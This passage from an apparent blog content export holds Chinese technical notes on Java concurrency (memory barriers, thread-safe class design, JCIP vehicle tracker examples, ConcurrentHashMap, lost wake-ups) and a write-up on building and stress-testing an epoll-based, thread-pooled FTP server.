subsection.</li>\n<li>Data dependency barrier:  <strong>A data dependency barrier is a weaker form of read barrier. In the case where two loads are performed such that the second depends on the result of the first</strong> (eg: the first load retrieves the address to which the second load will be directed), a data dependency barrier would be required to make sure that the target of the second load is updated after the address obtained by the first load is accessed. </li>\n<li>General memory barriers. <strong>A general memory barrier gives a guarantee that all the LOAD and STORE operations specified before the barrier will appear to happen before all the LOAD and STORE operations specified after the barrier with respect to the other components of the system</strong>. </li>\n<li>Write memory barrier: <strong>A write memory barrier gives a guarantee that all the STORE operations specified before the barrier will appear to happen before all the STORE operations specified after the barrier with respect to the other components of the system</strong>. </li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<h3 id=\"设计线程安全类\"><a href=\"#设计线程安全类\" class=\"headerlink\" title=\"设计线程安全类\"></a>设计线程安全类</h3><ul>\n<li>三个要素<ul>\n<li>找出构成对象状态的所有变量<ul>\n<li>如果在对象域中引用了其他对象，那么该对象的状态就包含被引用对象的域</li>\n<li>在定义哪些变量将构成对象的状态时，只考虑对象拥有的数据</li>\n</ul>\n</li>\n<li>找出约束状态变量的不变性条件</li>\n<li>建立对象状态的并发访问管理策略<ul>\n<li>同步策略定义了如何在不违背对象不变条件或后验条件（在操作中会包含一些后验条件来判断状态的迁移是否有效——比如要求某变量如果当前是17，那么下一次更新是18）的情况下对其状态的访问操作进行协同</li>\n<li>同步策略规定了如何将不可变性、线程封闭、加锁机制等结合起来维护线程的安全性。还规定了哪些变量由哪些锁来保护</li>\n<li>必须要将同步策略写为正式文档</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>尽可能使用final域以缩小状态空间</li>\n<li>如果变量的某些状态是无效的，那么就要对该变量进行封装以避免用户的修改使得该变量处于无效状态。如果某个操作中存在无效的状态转换那么该操作就必须是原子的</li>\n<li>如果一个类是由多个独立且线程安全的状态变量组成，并且所有的操作都不包含无效的状态转换，那么可以将线程安全性委托给底层的状态变量</li>\n<li>如果一个状态变量是线程安全的，并且没有任何不变性条件来约束它的值，在变量的操作上也不存在任何不允许的状态转换（然而按照线程安全的定义，似乎如果满足以上要求，那么线程安全也就必然满足），那么就可以安全地发布这个变量</li>\n<li>当把线程安全委托给底层的线程安全对象时，如果这些变量不是<code>final</code>，那么会导致一个问题——引用可能会引用了另一个对象。</li>\n</ul>\n<h3 id=\"基于现有的线程安全类添加特性\"><a href=\"#基于现有的线程安全类添加特性\" class=\"headerlink\" title=\"基于现有的线程安全类添加特性\"></a>基于现有的线程安全类添加特性</h3><ul>\n<li>最好的方法是直接修改原始类，这需要理解代码中的同步策略。好处在于所有实现同步策略的代码在同一个源文件中</li>\n<li>另一种方法是extend这个类，但是可能有的类的一些状态是private，子类访问不到，所以行不通。不好的地方在于同步策略的实现被分布到多个单独维护的源文件中，如果底层的类改变了同步策略那么子类就不安全了。</li>\n<li>客户端加锁：对于使用对象X的用户代码，在用户代码中，使用X本身用于保护其状态的锁来保护这段用户代码。这里的问题在于，如果文档没有明确指出X使用的锁，那么这个锁在以后版本中可能会修改，从而导致用户代码相对于X的代码不是原子的（在用户代码执行过程中，X内的代码可能执行）。这种会破坏同步策略的封装性（类似于extend会破坏实现的封装性）。与前一种一样，都是将派生类的行为与基类的行为耦合在一起</li>\n<li>组合：类似于<code>Collections.synchronizedXXX</code>，用户传递一个对象给该方法（转移所有权，以后都通过这个工厂方法返回的对象来操作），新对象内使用委托和加锁来实现。这种不依赖于被委托对象的线程安全性和使用的锁策略</li>\n</ul>\n<h3 id=\"依赖状态的操作\"><a href=\"#依赖状态的操作\" class=\"headerlink\" title=\"依赖状态的操作\"></a>依赖状态的操作</h3><ul>\n<li>类的不变性条件和后验条件约束了在对象上有哪些状态和状态转换是有效的。在某些对象的方法中还包含一些基于状态的先验条件（比如，从队列中pop时，队列必须非空）。如果某个操作中包含有基于状态的先验条件，则这个操作就叫做依赖状态的操作</li>\n</ul>\n<h3 id=\"使用私有的锁-vs-使用对象的内置锁\"><a href=\"#使用私有的锁-vs-使用对象的内置锁\" class=\"headerlink\" title=\"使用私有的锁 vs 使用对象的内置锁\"></a>使用私有的锁 vs 使用对象的内置锁</h3><ul>\n<li>优点<ul>\n<li>私有锁可以将锁封闭起来，避免用户代码得到锁，以避免用户代码参与到同步策略中</li>\n<li>如果使用内置锁，要想验证锁是否被正确使用，需要检查整个程序</li>\n</ul>\n</li>\n</ul>\n<h3 id=\"实例分析\"><a href=\"#实例分析\" class=\"headerlink\" title=\"实例分析\"></a>实例分析</h3><h4 id=\"一个线程安全的车辆追踪器的代码解析\"><a href=\"#一个线程安全的车辆追踪器的代码解析\" class=\"headerlink\" title=\"一个线程安全的车辆追踪器的代码解析\"></a>一个线程安全的车辆追踪器的代码解析</h4><ul>\n<li><p>不可变的Point类，因为不可变，所以复制map时只需要复制map的结构，无需复制Point的内容。返回的unmodifableMap也类似如此。（代码来源，JCIP代码清单4.7和4.6）</p>\n <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DelegatingVehicleTracker</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> ConcurrentMap&lt;String, Point&gt; locations;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Map&lt;String, Point&gt; unmodifiableMap;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 构造函数的安全依赖于用户——如果用户在构造函数运行时，</span></span><br><span class=\"line\">    <span class=\"comment\">// 修改参数points的内容，那么locations的视图就可能是不一致的。</span></span><br><span class=\"line\">    <span class=\"comment\">// 并且，用户需要自己保证这个DelegatingVehicleTracker类是安全的发布的，</span></span><br><span class=\"line\">    <span class=\"comment\">// 从而，保证在构造函数运行完之前，类内的其他非静态函数不会被调用</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">DelegatingVehicleTracker</span><span class=\"params\">(Map&lt;String, Point&gt; points)</span> </span>&#123;</span><br><span class=\"line\">        locations = <span class=\"keyword\">new</span> ConcurrentHashMap&lt;&gt;(points);</span><br><span class=\"line\">        unmodifiableMap = Collections.unmodifiableMap(locations);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 返回的unmodifiableMap内部是没有同步的，</span></span><br><span class=\"line\">    <span class=\"comment\">// 那么，locations的修改是如何反映到unmodifiableMap的？</span></span><br><span class=\"line\">    <span class=\"comment\">// 通过ConcurrentMap来保证</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Map&lt;String, Point&gt; <span class=\"title\">getLocations</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> unmodifiableMap;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Point <span class=\"title\">getLocation</span><span class=\"params\">(String id)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> locations.get(id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setLocation</span><span class=\"params\">(String id, <span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (locations.replace(id, <span class=\"keyword\">new</span> Point(x, y)) == <span class=\"keyword\">null</span>)</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IllegalArgumentException(</span><br><span class=\"line\">                    <span class=\"string\">\"invalid vehicle name: \"</span> + id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Point</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">final</span> <span class=\"keyword\">int</span> x, y;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">Point</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.x = x;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.y = y;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>可变的线程安全的Point，如果在point的状态上施加不变性任何约束，那么以下就不是线程安全的，因为用户可以修改返回的point对象。（代码来源，JCIP代码清单4.11，4.12）</p>\n <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">PublishingVehicleTracker</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Map&lt;String, SafePoint&gt; locations;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> Map&lt;String, SafePoint&gt; unmodifiableMap;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">PublishingVehicleTracker</span><span class=\"params\">(</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">            Map&lt;String, SafePoint&gt; locations)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.locations</span><br><span class=\"line\">                = <span class=\"keyword\">new</span> ConcurrentHashMap&lt;&gt;(locations);</span><br><span class=\"line\">        <span class=\"keyword\">this</span>.unmodifiableMap</span><br><span class=\"line\">                = Collections.unmodifiableMap(<span class=\"keyword\">this</span>.locations);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> Map&lt;String, SafePoint&gt; <span class=\"title\">getLocations</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> unmodifiableMap;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> SafePoint <span class=\"title\">getLocation</span><span class=\"params\">(String id)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> locations.get(id);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">setLocation</span><span class=\"params\">(String id, <span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (!locations.containsKey(id))</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> IllegalArgumentException(</span><br><span class=\"line\">                    <span class=\"string\">\"invalid vehicle name: \"</span> + id);</span><br><span class=\"line\">        locations.get(id).set(x, y);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">SafePoint</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> x, y;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">private</span> <span class=\"title\">SafePoint</span><span class=\"params\">(<span class=\"keyword\">int</span>[] a)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>(a[<span class=\"number\">0</span>], a[<span class=\"number\">1</span>]);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// 此处，如果实现为`this(p.x, p.y)`就会有竞态条件，</span></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">SafePoint</span><span class=\"params\">(SafePoint p)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>(p.get());</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"title\">SafePoint</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.x = x;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.y = y;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">int</span>[] get() &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"keyword\">int</span>[]&#123;x, y&#125;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">set</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span> </span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.x = x;</span><br><span class=\"line\">            <span class=\"keyword\">this</span>.y = y;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h3 id=\"ConcurrentHashMap\"><a href=\"#ConcurrentHashMap\" class=\"headerlink\" title=\"ConcurrentHashMap\"></a>ConcurrentHashMap</h3><blockquote>\n<p>来自JCIP的5.2.1，不清楚JDK5之后有没有修改</p>\n</blockquote>\n<ul>\n<li>使用一种粒度更细的加锁机制——分段锁</li>\n<li>一定数量的写入线程可以并发的修改Map</li>\n<li>迭代器具有弱一致性，而不是fail-fast（HashMap等的是fail-fast，从而如果迭代时发现数量变化了，就会抛出<code>ConcurrentModificationException</code>），不会抛出<code>ConcurrentModificationException</code>。可以容忍并发的修改</li>\n<li><code>size</code>返回的只是估计值</li>\n<li>内部没有实现对map加锁以独占访问（对比之下，同步容器<code>Hashtable</code>，<code>synchronizedMap</code>中可以通过获取map的锁来实现独占），所以不能在用户代码通过获取map的锁来独占（所以如果确实需要独占，应该放弃ConcurrentHashMap）</li>\n</ul>\n<h3 id=\"condition\"><a href=\"#condition\" class=\"headerlink\" title=\"condition\"></a>condition</h3><h4 id=\"Condition-signal要在持有锁时才能调用\"><a href=\"#Condition-signal要在持有锁时才能调用\" class=\"headerlink\" title=\"Condition.signal要在持有锁时才能调用\"></a><code>Condition.signal</code>要在持有锁时才能调用</h4><ul>\n<li><p>lost-wake-up问题，比如说代码如下</p>\n <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cnt+=<span class=\"number\">1</span>;</span><br><span class=\"line\">notify();</span><br></pre></td></tr></table></figure>\n <figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span>(cnt&lt;=<span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">    wait();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>然后，在检查了<code>cnt&lt;=0</code>这个条件后、调用<code>wait</code>之前，有个线程完成了<code>cnt++;notify()</code>的操作，那么消费者就丢失了wake-up，陷入了无限等待（如果其在等待时没有被唤醒的话）</p>\n</li>\n</ul>\n","slug":"Java-Concurrent-Note","categories":[{"name":"JAVA","slug":"JAVA","permalink":"https://h-zex.github.io/categories/JAVA/"},{"name":"JavaConcurrency","slug":"JAVA/JavaConcurrency","permalink":"https://h-zex.github.io/categories/JAVA/JavaConcurrency/"}],"tags":[]},{"title":"开发一个高并发的FTP服务器","date":"2019-03-20T13:58:41.000Z","path":"2019/03/20/开发一个高并发的FTP服务器/","text":"需求 根据RFC959 高并发(C3K~C4K) 架构 在主线程使用epoll，监听listen在21端口的fd，和所有用户的命令链接的fd（以下均以cmdFd简称之） 一旦某个fd就绪，就将其封装成任务对象提交给线程池去执行 每个用户关联一个Session对象，根据RFC的要求，可以实现为，任意时刻只有小于等于一个线程在handle这个session对象 12345678910111213141516171819$ tree src/main src/main├── config│ └── config.hpp├── core│ ├── FTP.hpp│ ├── Login.hpp│ ├── NetworkManager.hpp│ └── Session.hpp├── main.cpp├── tools│ ├── FileSystem.hpp│ ├── ListFiles.hpp│ └── ThreadPool.hpp└── util ├── Def.hpp ├── NetUtility.hpp ├── ThreadUtility.hpp └── Utility.hpp 线程安全的线程池类的设计 见笔者的另一篇博文Construct a Thread-Safe ThreadPool Utility 对于POSIX的 read、write等IO函数、accept等网络函数、epoll、pthread等函数创建wrap函数，用于处理各种错误，使得业务方可以简单的使用 要根据manual，对所有可能出现的errno进行处理。我的处理方法是，对于可以明确知道不应该出现的errno，一旦出现，就调用bug函数；对于EINTR，根据需求进行再次尝试或返回；对于不明确是否是合法情况的错误，输出一个warning，然后不改变errno，返回给用户；尽量使得这些wrap函数不需要返回过于复杂的信息，能返回void尽量返回void，能返回bool就不要返回int ReadWithBuf函数：学的是CSAPP的方法，让用户每次调用都传入一个相同的ReadBuf对象，在这个对象里存预读取的数据，这样子就可以每次读都读1024B（ReadBuf里面的buf的大小是1024B），从而减少read这个syscall调用的次数，可以提高效率 FTP类Session在多线程下的线程安全的保证 FTP类需要保证很重要的一点：任意一个session在任意一个时刻，只有小于等于1个线程正在handle该Session 在代码里我是这样保证的 对于用户的cmdFd，epoll等待的事件不仅仅是EPOLLIN，还需要EPOLLONESHOT。EPOLLONESHOT的含义是，一旦一个Fd被从epoll_wait返回，那么其就不再从epoll_wait返回，即使有事件发生。直到用户对这个fd使用EPOLL_CTL_MOD调用epoll_ctl指示等待的事件 EPOLLONESHOT (since Linux 2.6.2) Sets the one-shot behavior for the associated file descriptor. This means that after an event is pulled out with epoll_wait(2) the associated file descriptor is internally disabled and no other events will be reported by the epoll interface. The user must call epoll_ctl() with EPOLL_CTL_MOD to rearm the file descriptor with a new event mask. 从而使得，一个Session正在被handle的过程中，没有新的线程会去handle这个Session 创建新Session的函数epoll_wait、accept的函数在同一个线程，从而在创建新Session时，不会有新的线程去handle这个正在创建的Session destroySession时，持有一个mutex，从而，即使对应的cmdFd关闭了，OS复用了这个fd，但是其创建新Session会被阻塞，从而在该Session完全destroy之前，没有新线程会handle该Session 信号处理 按照CSAPP建议的6条规则，逐一介绍以下 handler要尽可能简单，比如只是设置一个flag handler里只能调用异步信号安全的函数（比如只访问局部变量的函数，比如不能被信号中断的函数）。异步信号安全不同于线程安全，线程安全中，对于非线程安全的函数的调用，可以通过持有同一把锁来实现线程安全；但是因为信号是异步的，所以如果在持有锁时信号到来，handler运行，则会死锁——因为handler调用该函数前也要持有锁，CSAPP 3rd（英文版）的P757有一个异步线程安全的函数的表，其中不包括exit、printf等常见函数 保存和恢复errno。因为信号handler中调用的函数可能会在失败时设置errno，所以可能会干扰正常程序中的errno，所以需要在刚进入handler时保存errno，而在退出前恢复errno 如果访问了全局的数据结构，那么需要阻塞所有信号。因为笔者的handler中只是设置了一个flag，而对bool型的flag的读或写，intel保证是原子的，所以无需如此 引用自Intel® 64 and IA-32 Architectures Software Developer’s Manual (2018 5 18), Vol.3A ch8 The Intel486 processor (and newer processors since) guarantees that the following basic memory operations will always be carried out atomically(atomically: That is, once started, the processor guarantees that the operation will be completed before another processor or bus agent is allowed access to the memory location.): Reading or writing a byte Reading or writing a word aligned on a 16-bit boundary Reading or writing a doubleword aligned on a 32-bit boundary 使用volatile声明flag，volatile要求编译器每次在代码中引用flag时，都从内存中读取该值。不过需要注意的是，有些编译器下的volatile并没有类似于java中的volatile的内存可见性的保证 Writing to a volatile field has the same memory effect as a monitor release, and reading from a volatile field has the same memory effect as a monitor acquire. In effect, because the new memory model places stricter constraints on reordering of volatile field accesses with other field accesses, volatile or not, anything that was visible to thread A when it writes to volatile field f becomes visible to thread B when it reads f.(引用自JSR 133 (Java Memory Model) FAQ) 使用sig_atomic_t声明变量。C99的sig_atomic_t有这么一段注释 12345/* * C99: An integer type that can be accessed as an atomic entity, * even in the presence of asynchronous interrupts. * It is not currently necessary for this to be machine-specific. */ 并且按照intel的manual，读或写一个byte是原子的，所以笔者直接用了bool 还有一个很重要的点，race Condition。以下代码截取自FTP class 123456789// make sure there is no race condition:// the signal occur after check willExit and before epoll_wait// then the epoll_wait may not wake up.pthreadSigmaskWrap(SIG_BLOCK, &amp;sigToBlock, &amp;oldSigSet);if (willExit) &#123; break;&#125;int waitFdCnt = epollPWaitWrap(this-&gt;epollFd, evArray, evArraySize, -1, oldSigSet);pthreadSigmaskWrap(SIG_SETMASK, &amp;oldSigSet); 为什么要写的这么麻烦，而不是直接使用epoll_wait。因为，虽然如果没有阻塞信号时，epoll_wait收到SIGINT会返回，但是，如果该信号是在检查了willExit标志之后、epoll_wait之前到来呢，那么，我们将错过这个信号——epoll_wait不会返回，从而没有机会去再次检查willExit。所以，需要在检查willExit与epoll_wait之间阻塞信号，并且要在epoll_wait期间不阻塞SIGINT，这意味着需要原子的做这件事情，这就是epoll_pwait帮我们做的 ref from epoll_pwait manual The following epoll_pwait() call: 12&gt; ready = epoll_pwait(epfd, &amp;events, maxevents, timeout, &amp;sigmask);&gt; is equivalent to atomically executing the following calls: 123456&gt; sigset_t origmask;&gt; &gt; pthread_sigmask(SIG_SETMASK, &amp;sigmask, &amp;origmask);&gt; ready = epoll_wait(epfd, &amp;events, maxevents, timeout);&gt; pthread_sigmask(SIG_SETMASK, &amp;origmask, NULL);&gt; 压测压测步骤 笔者的压测程序使用java写的，代码在这里https://github.com/H-ZeX/FTP-Implement/tree/master/test/FTPServerTester 压测包括 登录 列出某个目录 上传100KB的文件 根据配置，sleep(HANG_TIME)，在C3K～C4K的测试结果中，HANG_TIME=0 压测前，运行server的命令是 1234ulimit -s unlimited -f unlimited -d unlimited -n unlimited su rootecho 20000 &gt; /proc/sys/net/core/somaxconnsudo ./FTPServer [port] &gt; /tmp/FTPServerOutput 修改somaxconn是为了使得baclog足够大 将stdout重定向到/tmp/FTPServerOutput是为了使得错误信息清晰的显示出来 之所以需要sudo，是因为使用了OS的账户验证机制来实现用户登录 ./FTPServer [port]的[port]参数可以不指定，也就是直接sudo ./FTPServer &gt; /tmp/FTPServerOutput,这样将会监听在8001端口 然后运行java -ea -jar -Dexternal.config=file:/tmp/1.properties FTPServerTester-1.0-SNAPSHOT.jar FTPServerTester-1.0-SNAPSHOT.jar在根目录的test目录下（不是在src/test的那个test目录） /tmp/1.properties是配置文件，因为需要包含测试账户信息，所以需要自己定制，样例如下 123456789101112131415161718192021222324252627282930StressTest.TestCnt=10StressTest.MaxCmdConnectionCnt=1000StressTest.MaxThreadCnt=1024# the time(millisecond) to hand on the connectionStressTest.HangTime=1000# 你运行FTPServer的host的地址Tester.TesterServerAddress=10.243.6.109# 你运行Tester的host地址# 必须保证运行server的host与运行tester的host是可以互通的# 包括，tester可以主动链接server，server也可以主动链接testerTester.YourselfAddress=10.243.6.43Tester.ServerPort=8001# 系统上账户的用户名Tester.UserName=# 系统上账户的密码Tester.Password=# 这些是以逗号分隔的目录列表 # 必须是绝对路径# 这些目录数量应该&gt;=20个，越多越好，太少的话，测试会很慢# 因为多个用户访问少数几个目录会很慢# 如果你的测试程序与这个FTPserver运行在不同的主机上，那么FTPServer运行的主机上应该存在这些目录# 如果运行在同一台机子上，测试程序会创建这些目录Tester.ListTestDir=/tmp/testDir_1,/tmp/testDir_2,/tmp/testDir_3,/tmp/testDir_4,/tmp/testDir_5,/tmp/testDir_6,/tmp/testDir_7,/tmp/testDir_8,/tmp/testDir_9,/tmp/testDir_10,/tmp/testDir_11,/tmp/testDir_12,/tmp/testDir_13,/tmp/testDir_14,/tmp/testDir_15,/tmp/testDir_16,/tmp/testDir_17# 这个目录必须是绝对路径# 如果你的测试程序与这个FTPserver运行在不同的主机上，那么FTPServer运行的主机上应该存在这些目录# 如果运行在同一台机子上，测试程序会创建这些目录Tester.StorTestDir=/tmp/FTPSeverTesterStorDirs____23233dd22/ 压测结果 笔者的测试与server都跑在同一台机器上 笔者在自己的机器上(Intel i7-8550U, 16G内存，没有SSD)，StressTest.MaxCmdConnectionCnt设为10240及以下时，测试可以顺利完成。并且在测试过程使用linux的ftp命令与server通信，是比较流畅的 在如下设置测试参数后 123StressTest.MaxCmdConnectionCnt=10000StressTest.MaxThreadCnt=4024StressTest.HangTime=0 sudo watch -n 0.5 &quot;netstat -anp | grep -i &lt;PID&gt; | grep -i &quot;est&quot; | wc -l &quot;可以看到数目是3K到4K之间波动，并且测试期间手动与服务器通信是比较流畅的 出现的问题 测试程序开50k个链接连server进行操作（50k个测试是依次提交给线程池，边提交线程池边运行），server需要openListenFd，由OS指定端口，但是在测试程序成功进行了15k多一点的测试后，server的这个openListenFd失败，errno是Address already in use。 我猜测，可能是很多端口处于TIME_WAIT状态，虽然打开的socket设置了SO_REUSEADDR，可以绑定这些TIME_WAIT链接的端口，但是刚好，对端也是上一次那个链接的端口，这是TCP禁止的——TCP允许复用处于TIME_WAIT的端口，但是不允许新的链接与TIME_WAIT的链接的(serverIp, serverPort, serverIp, serverPort)相同（其实也不是一定禁止，TCP规范是允许有例外），所以就提示Address already in use server listen的端口的backlog设太小（20），测试程序开的链接数一多，就有一些链接三次握手成功，但是hang住在读取welcome信息那里，详见笔者的另一篇博文高并发情况下backlog过低出现的问题 缺点 因为使用是线程池，并且似乎一个线程不能设置另一个线程的uid（欢迎指正！），所以无法利用OS的机制实现权限控制 只有单个线程accept，可以通过linux内核3.9的一个特性SO_REUSEPORT来实现多线程accept，并且没有惊群、负载不均衡的问题（The SO_REUSEPORT socket option）","raw":"---\ntitle: 开发一个高并发的FTP服务器\ndate: 2019-03-20 21:58:41\ntags:\n- FTP 服务器\n- 高并发\ncategories:\n- 网络编程\n- 并发编程\n---\n\n### 需求\n\n- 根据RFC959\n- 高并发(C3K~C4K)\n\n### 架构\n\n- 在主线程使用epoll，监听listen在21端口的fd，和所有用户的命令链接的fd（以下均以cmdFd简称之）\n\n- 一旦某个fd就绪，就将其封装成任务对象提交给线程池去执行\n\n- 每个用户关联一个Session对象，根据RFC的要求，可以实现为，任意时刻只有小于等于一个线程在handle这个session对象\n\n- ```\n  $ tree src/main \n  src/main\n  ├── config\n  │   └── config.hpp\n  ├── core\n  │   ├── FTP.hpp\n  │   ├── Login.hpp\n  │   ├── NetworkManager.hpp\n  │   └── Session.hpp\n  ├── main.cpp\n  ├── tools\n  │   ├── FileSystem.hpp\n  │   ├── ListFiles.hpp\n  │   └── ThreadPool.hpp\n  └── util\n      ├── Def.hpp\n      ├── NetUtility.hpp\n      ├── ThreadUtility.hpp\n      └── Utility.hpp\n  ```\n\n### 